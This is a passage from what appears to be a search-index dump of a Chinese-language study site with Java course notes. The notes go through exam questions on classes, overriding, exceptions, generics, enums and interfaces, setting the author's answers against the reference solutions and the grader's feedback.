<p>\u5199\u5b8c\u540e\u4f7f\u7528\u4e0a\u8ff0\u7a0b\u5e8f\u6d4b\u8bd5\u6267\u884c\u7684\u7ed3\u679c\u5e94\u8be5\u662f\uff1a</p> <pre><code>(true &amp;&amp; !(true &amp;&amp; false))\n= true\n</code></pre>"},{"location":"cs/java/basics/t1/#boolnot","title":"BoolNot","text":"<pre><code>class BoolNot extends BoolExpr {\n    BoolExpr expr; // \u58f0\u660e\u4e00\u4e2a\u53d8\u91cf\uff0c\u7528\u4e8e\u4fdd\u5b58\u4f20\u5165\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\n\n    public BoolNot(BoolExpr expr) {\n        this.expr = expr; // \u5728\u6784\u9020\u51fd\u6570\u4e2d\u5c06\u4f20\u5165\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\u4fdd\u5b58\n    }\n\n    @Override\n    public void describe() {\n        System.out.print(\"!\");\n        expr.describe();\n    }\n\n    @Override\n    public boolean evaluate() {\n        return !expr.evaluate();\n    }\n}\n</code></pre> <p>\u6267\u884c <code>expr.describe\uff08\uff09;</code> Java \u4f1a\u67e5\u770b\u5f53\u524d\u5b58\u50a8\u5728 <code>expr</code> \u53d8\u91cf\u4e2d\u7684\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u578b \u3002</p> <ul> <li>\u5982\u679c <code>expr</code> \u5305\u542b\u4e00\u4e2a <code>BoolVal</code> \u5bf9\u8c61\uff08\u5982 <code>new BoolVal\uff08true\uff09</code>\uff09\uff0c\u5219\u5c06\u8c03\u7528 <code>BoolVal</code> \u7c7b\u4e2d\u5b9a\u4e49\u7684 <code>describe\uff08\uff09</code> \u65b9\u6cd5\uff08\u6253\u5370 <code>true</code> \u6216 <code>false</code>\uff09</li> <li>\u5982\u679c <code>expr</code> \u5305\u542b\u4e00\u4e2a <code>BoolAnd</code> \u5bf9\u8c61\uff08\u5982 <code>new BoolAnd\uff08...\uff09</code>\uff09\uff0c\u90a3\u4e48\u5728 <code>BoolAnd</code> \u7c7b\u4e2d\u5b9a\u4e49\u7684 <code>describe\uff08\uff09</code></li> <li>\u5982\u679c <code>expr</code> \u5305\u542b\u53e6\u4e00\u4e2a <code>BoolNot</code> \u5bf9\u8c61\uff08\u5982 <code>new BoolNot\uff08...\uff09</code>\uff09\uff0c\u5219\u5c06\u518d\u6b21\u8c03\u7528 <code>BoolNot</code> \u7c7b\u4e2d\u5b9a\u4e49\u7684 <code>describe\uff08\uff09</code> \u65b9\u6cd5</li> </ul>"},{"location":"cs/java/basics/t1/#booland","title":"BoolAnd","text":"<pre><code>class BoolAnd extends BoolExpr {\n    BoolExpr left;\n    BoolExpr right;\n\n    public BoolAnd(BoolExpr left, BoolExpr right) {\n        this.left = left;\n        this.right = right;\n    }\n\n    @Override\n    public void describe() {\n        System.out.print(\"(\");\n        left.describe();\n        System.out.print(\" &amp;&amp; \");\n        right.describe();\n        System.out.print(\")\");\n    }\n\n    @Override\n    public boolean evaluate() {\n        return left.evaluate() &amp;&amp; right.evaluate();\n    }\n}\n</code></pre> <p>\u8fd9\u9898\u9700\u8981\u5bf9\u7c7b\u8fd9\u4e00\u7ae0\u6709\u5f88\u597d\u7684\u7406\u89e3\uff0c\u9700\u8981\u9a6c\u4e0a\u5f25\u8865\u8fd9\u4e00\u5757\u77e5\u8bc6\u70b9</p>"},{"location":"cs/java/basics/t1/#q14","title":"Q14","text":"<p>Write a class called TempLog that represents a series of regular temperature measurements. The class must have a single constructor that takes the maximum number of measurements that will be logged in this object. The class must have a addTemp method that, given a new measurement, appends it to the log. If there is not capacity to append the measurement, it should be discarded. There should be no way to edit the measurements other than via the addTemp method. The class must have a rangeMax method that, given a pair of indices into the log, returns the maximum temperature recorded between the first and second index, inclusive. You may assume that rangeMax will only be called with indices that specify a non-empty range of measurements. The following is an example of how this class is expected to be used, and how it is expected to behave:</p> <pre><code>TempLog log = new TempLog(10); // Capacity for 10 measurements\nlog.addTemp(-4.3);\nlog.addTemp(10.5);\nlog.addTemp(18.6);\nlog.addTemp(27.9);\nlog.addTemp(22.6);\nlog.rangeMax(0, 0); // Should return -4.3\nlog.rangeMax(1, 2); // Should return 18.6\nlog.rangeMax(1, 4); // Should return 27.9\nlog.addTemp(35.0);\nlog.rangeMax(2, 5); // Should return 35.0\n</code></pre> <p>\u9898\u76ee\u63d0\u53ca\u9700\u8981\u4e00\u4e2a <code>constructor</code> \u5206\u914d <code>capacity</code>\uff0c<code>addTemp</code> \u6dfb\u52a0\u8fdb\u5217\u8868</p> <p>\u6ca1\u6709\u5bb9\u91cf\u4e86\u76f4\u63a5\u5ffd\u7565\uff0c\u5b9e\u73b0 <code>rangeMax</code> \u529f\u80fd\u3002\u521d\u6b65\u8bbe\u60f3\u5e94\u8be5\u662f\u7528\u6570\u7ec4\u7ed3\u5408\u7c7b\u5b9e\u73b0\u3002</p>"},{"location":"cs/java/basics/t1/#variables","title":"Variables","text":"<ul> <li><code>double[]</code> </li> </ul> <ul> <li><code>int capacity</code> \u5206\u914d\u7ed9\u8fd9\u4e2a <code>doubel[]</code></li> <li><code>double result</code> \u7528\u4e8e\u8bb0\u5f55\u6700\u5927\u7ed3\u679c</li> </ul>"},{"location":"cs/java/basics/t1/#function","title":"Function","text":"<ul> <li>\u5b9e\u73b0 MaxDouble \u7b97\u6cd5</li> </ul> <pre><code>public class TempLog {\n    private int len;\n    private double[] temps;\n\n    public TempLog(int capacity) {\n        len = 0;\n        temps = new double[capacity];\n    }\n\n    public void addTemp(double temp) {\n        if (len &lt; temps.length) {\n            temps[len++] = temp;\n        }\n    }\n\n    public double rangeMax(int lwr, int upr) {\n        double result = temps[upr];\n        for (int i = lwr; i &lt; upr; i++) {\n            if (temps[i] &gt; result)\n                result = temps[i];\n        }\n        return result;\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u4e3a\u6807\u51c6\u7b54\u6848\uff0c\u5728\u91cd\u5199\u8fc7\u7a0b\u4e2d\u610f\u8bc6\u5230\u81ea\u5df1\u5bf9 Java \u7684 Array \u7406\u89e3\u4e0d\u4f73</p> <p><code>array.length</code>\uff1a\u7528\u4e8e\u6570\u7ec4 \uff08<code>[]</code>\uff09\u3002\u5b83\u662f\u4e00\u4e2a\u63d0\u4f9b\u56fa\u5b9a\u5bb9\u91cf\u7684\u5c5e\u6027\u3002</p> <p><code>collection.size\uff08\uff09</code></p> <p>\u7528\u4e8e Collection \u7c7b \uff08\u5982 <code>ArrayList</code>\uff09\u3002\u8fd9\u662f\u4e00\u4e2a\u7ed9\u51fa\u5f53\u524d\u5143\u7d20\u6570\u91cf\u7684\u65b9\u6cd5\u3002</p> <p>\u7406\u89e3\u4e86\u5168\u90e8\u4ee3\u7801\u4e4b\u540e\u81ea\u5df1\u5199\u4e00\u904d\uff0c\u7528\u4e86\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\u5b9e\u73b0 <code>rangeMax</code>\u7406\u89e3\u4e86\u8001\u5e08\u65b9\u6cd5\u7684\u4e0d\u540c</p> <pre><code>public class TempLog {\n    private double[] tempList;\n    private int len;\n\n    public TempLog(int size) {\n        tempList = new double[size];\n        len = 0; // \u7528\u4e8e\u5f80\u6570\u7ec4\u91cc\u52a8\u6001\u6dfb\u52a0\u5143\u7d20\u7528\n    }\n\n    public void addTemp(double temp) {\n        // \u7531\u4e8e Java \u6ca1\u6709 Python \u90a3\u79cd\u52a8\u6001\u6570\u7ec4\n        // \u6240\u4ee5\u9700\u8981\u786e\u4fdd fixed size \u7684\u6570\u7ec4\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u6dfb\u52a0\u5143\u7d20\n        // \u56e0\u6b64 len &lt; tempList.length \u53ef\u786e\u4fdd\n        if (len &lt; tempList.length) {\n            tempList[len++] = temp;\n        }\n    }\n\n    public double rangeMax(int left, int right) {\n        /**\n         * \u7b97\u6cd5\u4e3a\u76f4\u63a5\u8bb0\u5f55 index L or R \u7684\u6570\u503c\u4e3a\u6700\u5927\u503c\uff0cloop \u4e2d\u5bf9\u6bd4\u6700\u7ec8\u8fd4\u56de result\n         */\n        double result = tempList[left];\n\n        for (int i = left; i &lt; right + 1; i++) {\n            if (result &lt; tempList[i]) {\n                result = tempList[i];\n            }\n        }\n        return result;\n    }\n}\n</code></pre> <p>\u6807\u51c6\u7b54\u6848\u4e2d\u76f4\u63a5\u5b9a\u4e49\u4e86 right index \u662f\u6700\u5927\u503c\uff0c\u56e0\u6b64\u5728\u5faa\u73af\u4e2d\u4e0d\u9700\u8981\u5305\u542b\u6700\u53f3 index</p> <p>\u56e0\u6b64\u6211\u7684\u65b9\u6cd5\u4e2d\u8981\u4e48 <code>right + 1</code> \u8981\u4e48\u5b9e\u73b0 <code>i &lt;= right</code> </p>"},{"location":"cs/java/basics/t2/","title":"2.0 T2","text":""},{"location":"cs/java/basics/t2/#q1","title":"Q1","text":"<pre><code>static Double mystery(Double[] values) {\n    if (values.length &lt; 1) throw new IllegalArgumentException();\n    Double result = values[0];\n    for (Double value : values) {\n        if (result.compareTo(value) &gt; 0) {\n            result = value;\n        }\n    }\n    return result\n}\n</code></pre> <p>What is the best description for what this method returns?</p> <p>Hint: The Java Documentation for <code>x.compareTo(y)</code> for <code>Double</code> says: This method returns the value <code>0</code> if <code>y</code> is numerically equal to <code>x</code>; a value less than <code>0</code> if <code>x</code> is numerically less than <code>y</code>; and a value greater than <code>0</code> if <code>x</code> is numerically greater than <code>y</code>.</p> <p>Select the single most correct answer.</p> <ul> <li>The minimum value in the array</li> <li>The maximum value in the array</li> <li>The median value in the array</li> <li>The last value less than the first element in the array</li> <li>The last value greater than the first element in the array</li> </ul> <p>\u8fd9\u9053\u9898\u6b63\u786e\u7b54\u6848\u662f\u52a0\u7c97\u884c\u4f46\u662f\u6211\u9009\u7684\u662f\u659c\u4f53\u884c</p> <p>\u8fd9\u9053\u9898\u7684\u6838\u5fc3\u5728\u4e8e <code>compareTo</code> \u8fd9\u4e2a\u65b9\u6cd5\uff0c\u76f8\u7b49 0, <code>x</code> \u5c0f\u8fd4\u56de -1, <code>x</code> \u5927\u8fd4\u56de 1</p> <ul> <li>5 - 6 \u884c\u7684\u6838\u5fc3\u903b\u8f91\u5728\u4e8e\u4ece\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5f00\u59cb\uff0c\u53ea\u8981\u5176\u5927\u4e8e\u540e\u7eed\u7684\u5143\u7d20\uff0c\u90a3\u4e48\u7ed3\u679c\u5c31\u662f\u540e\u7eed\u5143\u7d20</li> </ul> <ul> <li> <p>\u8fd9\u4e2a\u65f6\u5019\u8303\u56f4\u5df2\u7ecf\u7f29\u5c0f\u5230\u4e86\u6b63\u786e\u4ee5\u53ca\u6211\u9009\u7684\u7b54\u6848\u4e4b\u95f4\uff0c\u7531\u4e8e\u5bf9\u53d6\u6700\u5c0f\u7b97\u6cd5\u7684\u4e0d\u719f\u6089\u6000\u7591\u5176\u65e0\u6cd5\u6b63\u786e\u8bc6\u522b\u6700\u5c0f\u6570\uff0c\u5b9e\u9645\u4e0a\u627e\u6700\u5927\u503c\u4e5f\u662f\u5982\u6b64\uff1a</p> <pre><code>if (result.compareTo(value) &gt; 0) { // \u5982\u679c result \u5927\u4e8e value\n    result = value; // \u5c06 result \u66f4\u65b0\u4e3a\u66f4\u5c0f\u7684\u503c value\n}\n</code></pre> </li> </ul>"},{"location":"cs/java/basics/t2/#q3","title":"Q3","text":"<p>Which of the following statements about method overriding are true?</p> <p>There may be multiple correct answers. Select all of them.</p> <ul> <li>An overriding method will run the code in its body and then will automatically call the original version of the method.s</li> <li>An overriding method must have the same name as the original.</li> <li>An overriding method must have the same parameter types as the original.</li> <li>An overriding method must be marked using the <code>@Override</code> annotation or it will fail to compile.</li> </ul> <p>\u8fd9\u9053\u9898\u9519\u7684\u5f88\u53ef\u60dc\uff0c\u53ea\u9009\u4e86\u7b2c\u4e8c\u4e2a\uff0c\u7b2c\u4e09\u4e2a\u5f53\u65f6\u72b9\u8c6b\u4e86\uff0c\u628a <code>overload</code> \u4e0e <code>overide</code> \u641e\u6df7\u4e86\uff0c\u7b2c\u56db\u4e2a\u662f\u7f16\u8bd1\u5668\u4e0d\u4f1a\u62a5\u9519\u4e0d\u4ee3\u8868\u7f16\u8bd1\u5931\u8d25\u5f53\u65f6\u8bc6\u522b\u51fa\u6765\u4e86\u3002\u7b2c\u516d\u5468\u7684 Slide 11 \u4e2d\u7ed3\u5408\u95ee\u7b54\uff1a</p> <ul> <li>\u9664\u4e86 Covariant Return Types \u4e5f\u5c31\u662f\u8fd4\u56de\u5b50\u7c7b\u7c7b\u578b\u662f\u5408\u6cd5\u7684\u5916\uff0c\u5176\u4ed6\u8fd4\u56de\u7684\u7c7b\u578b\u3001\u53c2\u6570\u4ee5\u53ca\u540d\u79f0\u90fd\u5fc5\u987b\u4e0e\u7236\u7c7b\u76f8\u540c</li> </ul>"},{"location":"cs/java/basics/t2/#q6","title":"Q6","text":"<pre><code>public class Exceptional {\n    public static int counter = 0;\n\n    public static void go() throws Exception {\n        counter++;\n        try {\n            counter++;\n            if (counter &gt; 0) throw new Exception(\"Uh-oh!\");\n            counter++;\n        } catch (Exception e) {\n            counter += 10;\n        }\n        if (counter &gt; 0) throw new Exception(\"Not again!\");\n        counter++;\n    }\n\n    public static void main(String[] args) {\n        Exceptional ex = new Exceptional();\n        try {\n            ex.go();\n            counter++;\n        } catch (Exception e) {\n            counter += 10;\n        }\n        System.out.println(counter);\n    }\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u95ee\u6700\u540e <code>print</code> \u7684\u662f\u5565\uff0c\u76f4\u63a5\u8fd0\u884c\u4ee3\u7801\u8dd1\u51fa\u6765\u662f <code>22</code></p> <p>\u8003\u8bd5\u7684\u65f6\u5019\u5f53\u65f6\u5bf9 <code>throw</code> \u5f02\u5e38\u540e\u7684\u673a\u5236\u4e0d\u4e86\u89e3\uff0c\u5b9e\u9645\u4e0a <code>throw</code> \u9519\u8bef\u540e\u4f1a\u5bfb\u627e\u6700\u8fd1\u80fd <code>catch</code> \u7684\u5730\u65b9\u3002\u7b2c\u4e94\u4e03\u884c\u6267\u884c\u540e\u4e3a <code>2</code>\uff0c\u7b2c\u516b\u884c\u629b\u51fa\u540e\u5230\u4e86 <code>catch</code> \u8fd9\u91cc\u88ab\u6293\u4f4f\u52a0\u4e86 <code>10</code> \u53d8\u6210\u4e86 <code>12</code>\uff0c\u5341\u4e09\u884c\u7531\u4e8e\u6ca1\u6709\u5199 <code>catch</code> \u53ea\u662f\u629b\u51fa\uff0c\u56e0\u6b64\u76f4\u63a5\u8fdb\u5165 <code>main</code> \u51fd\u6570\u4e2d\u7684 <code>catch</code> \u884c\u518d\u52a0 <code>10</code> \u6700\u7ec8\u53d8\u6210 <code>22</code>.</p> <p><code>throw</code> \u8bed\u53e5\u4f1a\u7acb\u5373\u4e2d\u65ad\u5f53\u524d\u6267\u884c\u6d41\uff0c\u5e76\u5bfb\u627e\u6700\u8fd1\u7684\u5339\u914d <code>catch</code> \u5757\uff0c\u5982\u679c\u5f53\u524d\u65b9\u6cd5\u6ca1\u6709\u5339\u914d\u7684 catch\uff0c\u5f02\u5e38\u4f1a\u5411\u4e0a\u5c42\u65b9\u6cd5\u4f20\u64ad\u3002</p>"},{"location":"cs/java/basics/t2/#q11","title":"Q11","text":"<p>\u8fd9\u9898\u7ed9\u4e86\u4e00\u534a\u5206\u6570\uff0c\u8bf4\u6211 <code>Missing &lt;T&gt; return type</code> </p> <pre><code>// Picks the specified indices from `data` and returns a list of them\nstatic ArrayList&lt;Object&gt; select(ArrayList&lt;Object&gt; data, int[] indices) {\n    ArrayList&lt;Object&gt; result = new ArrayList&lt;&gt;();\n    for (int index : indices) {\n        try {\n            result.add(data.get(index));\n        } catch (IndexOutOfBoundsException e) {\n            // Ignore invalid indices, do nothing\n        }\n    }\n    return result;\n}\n</code></pre> <p>Rewrite this as a generic method instead of using the <code>Object</code> type.</p> <p>Object \u7c7b\u6765\u521b\u5efa\u53ef\u50a8\u5b58\u4efb\u610f\u6570\u636e\u7c7b\u578b\u7684\u7c7b\uff0c\u4f46\u662f\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u9700\u8981\u7c7b\u578b\u8f6c\u6362\u5e76\u4e22\u5931\u7c7b\u578b\u68c0\u67e5</p> <pre><code>int three = (Integer) ss.pop();\n</code></pre> <p>\u6539\u6210 generics \u5b9e\u4f8b\u5316\u540e\u662f\u8fd9\u6837</p> <pre><code>GenericStack&lt;Integer&gt; intStack = new GenericStack&lt;Integer&gt;(5); \n</code></pre> <p>Java 7 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86\u83f1\u5f62\u8fd0\u7b97\u7b26 <code>&lt;&gt;</code>\u3002\u5982\u679c\u4f60\u5728\u5de6\u4fa7\u663e\u5f0f\u58f0\u660e\u4e86\u7c7b\u578b <code>RunningMaximum&lt;Integer&gt; runningMax</code>\uff0c\u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4ece\u5de6\u4fa7\u63a8\u65ad\u51fa\u53f3\u4fa7\u7684\u6cdb\u578b\u7c7b\u578b\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5199\u6210 <code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;&gt;(1);</code>\uff0c\u53f3\u4fa7 <code>&lt;&gt;</code> \u4e2d\u65e0\u9700\u91cd\u590d\u7c7b\u578b\u3002</p> <p>Java 10 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86 <code>var</code>\u3002\u5982\u679c\u4f60\u5728\u53f3\u4fa7\u7684\u521d\u59cb\u5316\u8868\u8fbe\u5f0f\u4e2d\u63d0\u4f9b\u4e86\u8db3\u591f\u7684\u4fe1\u606f\u8ba9\u7f16\u8bd1\u5668\u63a8\u65ad\u51fa\u7c7b\u578b\u4f8b\u5982 <code>new RunningMaximum&lt;&gt;(1)</code>\uff0c\u5176\u4e2d <code>1</code> \u662f <code>Integer</code>\uff0c\u5982\u679c\u6784\u9020\u51fd\u6570\u63a5\u53d7 T \u7c7b\u578b\u53c2\u6570\uff0c\u7f16\u8bd1\u5668\u5c31\u80fd\u63a8\u65ad\u51fa T \u662f Integer\uff0c\u4f60\u5c31\u53ef\u4ee5\u7ed3\u5408 <code>var</code> \u548c\u83f1\u5f62\u8fd0\u7b97\u7b26\u5199\u6210 <code>var runningMax = new RunningMaximum&lt;&gt;(1);</code>\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u9053\u9898\u7684\u6838\u5fc3\u95ee\u9898\u5c31\u662f\u51fa\u5728\u6848\u4f8b\u91cc\u662f\u6709 1 \u4f5c\u4e3a\u53c2\u6570\u7684\u6240\u4ee5\u53ef\u4ee5 <code>&lt;&gt;</code> \u76f4\u63a5\u4f20\u518d\u52a0\u4e0a <code>var</code>\uff0c\u4f46\u662f\u8fd9\u9053\u9898 <code>Object</code> \u4e2d\u5c31\u6ca1\u6307\u5b9a <code>Arrarylist</code> \u5927\u5c0f\uff0c\u56e0\u6b64\u8981\u4e48 <code>&lt;&gt;</code> \u8981\u4e48 <code>var</code> \u9009\u4e00\u79cd\u4e0d\u80fd\u878d\u5408\uff0c\u5c5e\u4e8e\u7406\u89e3\u4e0d\u591f\u900f\u5f7b\u3002\u5728 Java \u4e2d\uff0c\u5f53\u4f60\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\u65f6\uff0c\u7d27\u8ddf\u5728\u7c7b\u540d\u540e\u9762\u7684\u62ec\u53f7 () \u7528\u6765\u8c03\u7528\u7c7b\u7684\u6784\u9020\u5668\uff08Constructor\uff09\u3002\u5f53\u4f60\u4f7f\u7528 <code>new ArrayList&lt;&gt;();</code>\u521b\u5efa <code>ArrayList</code> \u5bf9\u8c61\u65f6\uff0cJava \u4f1a\u4e3a\u5b83\u81ea\u52a8\u5904\u7406\u5bb9\u91cf\u7684\u5206\u914d</p> <pre><code>static ArrayList&lt;T&gt; select(ArrayList&lt;T&gt; data, int[] indices) {\n    var result = new ArrayList&lt;&gt;();\n    for (int index : indices) {\n        try {\n            result.add(data.get(index));\n        } catch (IndexOutOfBoundsException e) {\n            // Ignore invalid indices, do nothing\n        }\n    }\n    return result;\n}\n</code></pre> <p>\u56e0\u6b64\u8003\u8bd5\u65f6\u7b2c\u4e8c\u884c\u9519\u8bef\u5c31\u5728\u5c11\u4e86\u4e2a T\uff1a</p> <pre><code>// \u65b9\u5f0f 1\uff1a\u4f7f\u7528 var\uff0c\u4f46\u63d0\u4f9b\u53f3\u4fa7\u7c7b\u578b\u4fe1\u606f\nvar result = new ArrayList&lt;T&gt;(); \n// \u7f16\u8bd1\u5668\u6839\u636e\u53f3\u8fb9\u7684 ArrayList&lt;T&gt; \u63a8\u65ad result \u662f ArrayList&lt;T&gt;\n\n// \u65b9\u5f0f 2\uff1a\u4e0d\u4f7f\u7528 var\uff0c\u663e\u5f0f\u58f0\u660e\u7c7b\u578b\nArrayList&lt;T&gt; result = new ArrayList&lt;&gt;(); \n// \u5de6\u4fa7\u5df2\u7ecf\u6307\u5b9a\u4e86\u7c7b\u578b\uff0c\u53f3\u8fb9\u7684 &lt;&gt; \u53ef\u4ee5\u4f7f\u7528\u7c7b\u578b\u63a8\u65ad\uff08Java 7+\uff09\n</code></pre>"},{"location":"cs/java/basics/t2/#q12","title":"Q12","text":"<p>Write the following:</p> <ul> <li>An <code>enum</code> called <code>Step</code> with values <code>LEFT</code> and <code>RIGHT</code>.</li> <li>A static method <code>int displacement(Step[] steps)</code> that, given an array of steps, computes how many steps to the right of your starting point you would be if you took those steps in that sequence (negative indicates left of starting point).</li> </ul> <p>For example:</p> <pre><code>Step[] steps = new Step[]{Step.LEFT, Step.LEFT, Step.RIGHT, Step.LEFT};\nSystem.out.println(displacement(steps));  // Should print -2\n</code></pre> <pre><code>enum Step {\n    LEFT(-1), RIGHT(1);\n\n    int moveValue;\n\n    Step(int moveValue){\n        this moveValue = moveValue;\n    }\n\n    public int getValue(){\n        return moveValue;\n    }\n}\n\nstatic int displacement(Step[] steps){\n    int counter = 0;\n    for (step: steps){\n        counter = counter + step.getValue();\n    }\n    return counter;\n}\n</code></pre> <p>\u6211\u76f4\u63a5\u6309\u7167\u7b14\u8bb0\u5199\u7684\uff0c\u53cd\u9988\u63d0\u5230\u8bf4 </p> <p>- Valid enum type</p> <p>- Line 17: Missing <code>Step</code> type for <code>step</code></p> <p>\u7b2c\u4e03\u884c\u53ef\u4ee5\u770b\u5230\u5e94\u8be5\u662f <code>this.moveValue</code> \u7b2c\u5341\u4e03\u884c\u6ca1\u6709\u58f0\u660e <code>step</code> \u7c7b\u578b\u5e94\u8be5\u52a0\u4e0a <code>Step</code></p>"},{"location":"cs/java/basics/t2/#q13","title":"Q13","text":"<pre><code>abstract class Student extends Person {\n    public boolean isStudent() { return true; }\n}\n</code></pre> <p>Write the following:</p> <ul> <li>An abstract class called <code>Person</code> (from which <code>Student</code> inherits) that declares <code>isStudent()</code> as an abstract method.</li> <li>An interface called <code>Coder</code> that declares a <code>boolean canCode()</code> method.</li> <li>A non-abstract class called <code>ComputingStudent</code> that is a subclass of <code>Student</code>, inherits <code>isStudent()</code> from <code>Student</code>, and implements the <code>Coder</code> interface.</li> </ul> <p>\u4e0b\u9762\u662f\u6211\u7684\u4ee3\u7801\uff1a</p> <pre><code>public interface Coder {\n    boolean canCode();\n}\n\nabstract class Person {\n    abstract boolean isStudent();\n}\n\nclass ComputingStudent extends Student implements Coder{\n\n}\n</code></pre> <p>\u8bc4\u8bba\u63d0\u793a\u5728 <code>ComputingStudent</code>  \u7c7b\u4e2d\u5199 <code>canCode</code> \u65b9\u6cd5</p> <ul> <li>\u63a5\u53e3\u5728\u6982\u5ff5\u4e0a\u5c31\u662f\u62bd\u8c61\u7684\u3002\u663e\u5f0f\u5730\u5728\u63a5\u53e3\u58f0\u660e\u524d\u6dfb\u52a0 <code>abstract</code> \u5173\u952e\u5b57\u662f\u591a\u4f59\u7684\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5c06\u5176\u89c6\u4e3a\u62bd\u8c61\u7684\u3002\u63a5\u53e3\u65b9\u6cd5\u7684\u9ed8\u8ba4\u5c5e\u6027 (Implicitly <code>public abstract</code>)\uff0c\u6240\u4ee5\u7b2c\u4e00\u884c\u591a\u4f59\u4e86 <code>public</code></li> <li><code>implements Coder</code>\u5fc5\u987b\u5b9e\u73b0 <code>Coder</code> \u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5 <code>canCode()</code>\u3002</li> </ul>"},{"location":"cs/java/basics/t2/#q14","title":"Q14","text":"<p>\u8fd9\u9053\u9898\u6765\u4e0d\u53ca\u505a</p> <p>A substring of a string is any chunk of characters starting at some index and running for some length. For example, <code>\"TS20\"</code> is a substring of <code>\"CITS2005\"</code> starting at index 3 and of length 4.</p> <p>We say a string contains a repeated substring if the same non-empty substring appears more than once in the string. For example, <code>\"banana\"</code> has several repeated substrings, including <code>\"ana\"</code>, which appears at both indices 1 and 3.</p> <p>Write a class <code>RepeatChecker</code> which has:</p> <ul> <li>A static method <code>boolean hasRep(String str, int len)</code> that returns <code>true</code> if <code>str</code> contains a repeated substring of length <code>len</code>, and <code>false</code> otherwise.</li> <li>A static method <code>boolean hasRep(String str)</code> that returns <code>true</code> if <code>str</code> contains any repeated substring, and false otherwise.</li> </ul> <p>The efficiency of your algorithm is not important, but for full marks, you should avoid repeating code unnecessarily.</p> <p>Hint: Recall that <code>String</code> has a <code>.charAt(i)</code> method that gets the character at a specific index, and that it also has a <code>.length()</code> method that returns the number of characters in the string.</p> <p>\u5199\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u8fd4\u56de\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u4e0d\u662f\u6709\u91cd\u590d\u5b57\u7b26\uff0c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u80fd\u81ea\u5b9a\u4e49\u91cd\u590d\u5b57\u6bb5\u7684\u957f\u5ea6</p> <pre><code>class RepeatChecker {\n    private static boolean eqSubs(String str, int i, int j, int len) {\n        for (int o = 0; o &lt; len; o++) {\n            if (str.charAt(i + o) != str.charAt(j + o)) return false;\n        }\n        return true;\n    }\n    public static boolean hasRep(String str, int len) {\n        for (int i = 0; i + len &lt;= str.length(); i++) {\n            for (int j = i + 1; j + len &lt;= str.length(); j++) {\n                if (eqSubs(str, i, j, len)) return true;\n            }\n        }\n        return false;\n    }\n    public static boolean hasRep(String str) {\n        for (int len = 1; len &lt; str.length(); len++) {\n            if (hasRep(str, len)) return true;\n        }\n        return false;\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w10/","title":"10.0 Thread, Lambda","text":""},{"location":"cs/java/basics/w10/#multi-processing","title":"Multi Processing","text":"<p>\u591a\u8fdb\u7a0b\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u4e2a\u6838\u5fc3\u7279\u6027\uff0c\u5b83\u5141\u8bb8\u4f60\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u7a0b\u5e8f \u3002</p> <ul> <li>\u5982\u679c\u4f60\u7684\u8ba1\u7b97\u673a\u53ea\u6709\u4e00\u4e2a\u6838\u5fc3 (single core)\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u8c03\u5ea6\u8fdb\u7a0b\uff0c\u4f7f\u5b83\u4eec\u770b\u8d77\u6765\u50cf\u662f\u5e76\u53d1\u6267\u884c\u7684 </li> </ul> <ul> <li>\u5982\u679c\u8ba1\u7b97\u673a\u6709\u591a\u4e2a\u6838\u5fc3 (multiple cores)\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u8fd9\u4e9b\u8fdb\u7a0b\u5206\u914d\u5230\u4e0d\u540c\u7684\u6838\u5fc3\u4e0a\u6267\u884c \u3002</li> </ul> <p>\u5b9e\u73b0\u7684\u7b80\u5355\u65b9\u6cd5\u53ef\u80fd\u662f\u540c\u65f6\u8fd0\u884c\u51e0\u4e2a Java \u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6cd5\u6709\u9650\u5236\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u65e0\u6cd5\u901a\u4fe1</p>"},{"location":"cs/java/basics/w10/#multi-threading","title":"Multi Threading","text":"<p>\u5e76\u53d1\uff1a\u4e00\u4e2a\u5355\u72ec\u7684\u8fdb\u7a0b\u4e5f\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u6267\u884c\u7ebf\u7a0b\uff0c\u7528\u5904\u5982\u4e0b\uff1a</p> <ul> <li> <p>Responsiveness</p> <p>\u6211\u4eec\u6b63\u5728\u7f16\u5199\u8bfb\u53d6\u5927\u6587\u4ef6\u7684\u4ee3\u7801\u3002\u5982\u679c\u4e3a\u4e86\u7b49\u5f85\u6587\u4ef6\u52a0\u8f7d\u800c\u4e0d\u5f97\u4e0d\u6682\u505c\u6574\u4e2a\u7a0b\u5e8f\uff0c\u90a3\u5c06\u662f\u5f88\u7cdf\u7cd5\u7684\u3002\u76f8\u53cd\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u7ebf\u7a0b\u8bfb\u53d6\u6587\u4ef6\uff0c\u800c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u66f4\u65b0\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u6216\u6267\u884c\u5176\u4ed6\u64cd\u4f5c\u3002</p> </li> </ul> <ul> <li> <p>Efficiency</p> 